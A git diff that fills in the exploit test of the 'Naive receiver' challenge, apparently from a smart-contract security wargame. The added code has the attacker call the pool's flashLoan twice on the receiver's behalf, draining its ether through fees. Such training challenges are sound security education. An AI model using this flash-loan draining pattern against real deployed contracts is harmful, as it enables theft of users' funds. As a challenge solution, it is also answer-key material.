@@ -31,6 +31,19 @@ describe('[Challenge] Naive receiver', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */   
+        const amountToBorrow = ETHER_IN_RECEIVER.sub(ethers.utils.parseEther('1')); // sub 1 Ether for fee
+        console.log("------")
+        console.log(amountToBorrow.toString(10));
+        console.log("------")
+        await this.pool.connect(attacker).flashLoan(
+            this.receiver.address,  // borrower address
+            amountToBorrow
+        );
+        await this.pool.connect(attacker).flashLoan(
+            this.receiver.address,  // borrower address
+            amountToBorrow
+        );
+        // await this.pool.connect(attacker).flashLoan(this.receiver.address,ETHER_IN_RECEIVER);
     });
 
     after(async function () {
